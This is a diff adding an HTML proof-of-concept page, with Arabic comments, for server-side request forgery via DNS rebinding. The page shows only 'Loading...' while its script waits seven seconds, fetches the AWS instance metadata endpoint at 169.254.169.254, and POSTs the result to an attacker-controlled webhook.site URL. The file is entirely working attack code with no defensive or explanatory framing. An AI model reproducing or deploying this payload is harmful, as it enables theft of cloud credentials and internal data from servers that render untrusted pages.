@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF PoC</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // الرابط الخاص بك من webhook.site
+        const EXFIL_URL = "https://webhook.site/0c25a8ba-0fd2-4f4b-96ad-73c5dc17f46f";
+
+        // دالة لإرسال البيانات المسروقة
+        function exfiltrate(data) {
+            fetch(EXFIL_URL, {
+                method: 'POST',
+                mode: 'no-cors', // مهم لتجنب مشاكل CORS
+                headers: {
+                    'Content-Type': 'text/plain'
+                },
+                body: data
+            });
+        }
+
+        // إبلاغ عن بدء الهجوم
+        exfiltrate("PoC Script Loaded. Waiting for DNS Rebind...");
+
+        // محاولة الوصول إلى بيانات AWS Metadata بعد 7 ثوانٍ
+        // هذا التأخير يعطي فرصة لحدوث إعادة ربط DNS
+        setTimeout(() => {
+            exfiltrate("Attempting to fetch AWS metadata...");
+            fetch('http://169.254.169.254/latest/meta-data/')
+                .then(response => response.text())
+                .then(data => {
+                    // إذا نجح، أرسل البيانات المسروقة
+                    exfiltrate("SUCCESS! Leaked Data:\n\n" + data);
+                })
+                .catch(error => {
+                    // إذا فشل، أبلغ عن الخطأ
+                    exfiltrate("FAILED to fetch metadata. Error: " + error.toString());
+                });
+        }, 7000); // 7 ثوانٍ
+    </script>
+</body>
+</html>
